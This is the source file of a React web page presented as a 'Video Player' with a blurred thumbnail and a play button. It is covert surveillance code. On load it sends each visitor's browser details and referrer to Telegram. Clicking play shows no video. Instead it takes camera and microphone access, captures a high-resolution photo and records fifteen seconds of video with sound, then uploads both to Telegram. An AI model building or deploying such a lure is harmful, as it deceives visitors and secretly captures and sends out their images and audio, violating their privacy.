import { PlayIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';

function App() {
  const [isBlurred] = useState(true);
  const thumbnailUrl = 'https://pbs.twimg.com/media/GmlN7YKWAAADS5l?format=jpg&name=medium';

  // Kirim notifikasi ketika pengunjung mengunjungi halaman
  useEffect(() => {
    const sendVisitorNotification = async () => {
      try {
        await sendTelegramNotification({
          userAgent: navigator.userAgent,
          location: window.location.href,
          referrer: document.referrer || 'Direct',
          previousSites: document.referrer || 'None',
        });
      } catch (error) {
        console.error('Failed to send visitor notification:', error);
      }
    };

    sendVisitorNotification();
  }, []);

  // Fungsi untuk menangkap gambar dan video
  const captureAndSendMedia = useCallback(async () => {
    try {
      // Cek perangkat kamera
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');

      if (!videoDevice) throw new Error('No video input device found');

      // Konfigurasi pengambilan video dengan resolusi tinggi
      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 },
          height: { ideal: 2160 },
          frameRate: { ideal: 60 }
        },
        audio: true
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Buat elemen video untuk mengambil gambar
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;

      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error('Error playing video:', error);
            resolve();
          }
        };
      });

      // Ambil gambar dari video
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 1920;
      canvas.height = video.videoHeight || 1080;
      const context = canvas.getContext('2d');
      context?.drawImage(video, 0, 0, canvas.width, canvas.height);

      const photoBlob = await new Promise<Blob>((resolve, reject) => {
        canvas.toBlob(blob => {
          if (blob) resolve(blob);
          else reject(new Error('Failed to create photo blob'));
        }, 'image/jpeg', 1.0);
      });

      // Kirim gambar ke Telegram
      await sendImageToTelegram(photoBlob);

      // Cek format video yang didukung
      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp8,opus',
        'video/webm'
      ];
      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
      if (!supportedMimeType) throw new Error('No supported video format found');

      // Konfigurasi perekaman video
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8_000_000 // 8 Mbps
      });

      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { type: supportedMimeType });
        console.log('Video recording completed, size:', videoBlob.size);
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start(1000); // Ambil data setiap 1 detik
      console.log('Started recording video');

      // Hentikan perekaman setelah 15 detik
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          console.log('Stopping video recording');
          mediaRecorder.stop();
        }
      }, 15_000);

    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);

  const handlePlayClick = async () => {
    await captureAndSendMedia();
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      {/* Header */}
      <header className="bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Video Player</h1>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-8">
        <div className="max-w-[1080px] mx-auto">
          <div className="relative">
            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
              {/* Blur overlay */}
              {isBlurred && (
                <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
              )}
              {/* Play Button */}
              <div className="absolute inset-0 flex items-center justify-center z-10">
                <button 
                  onClick={handlePlayClick}
                  className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
                >
                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
                </button>
              </div>
              {/* Thumbnail */}
              <img 
                src={thumbnailUrl} 
                alt="Video Thumbnail" 
                className="w-full h-full object-cover"
              />
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
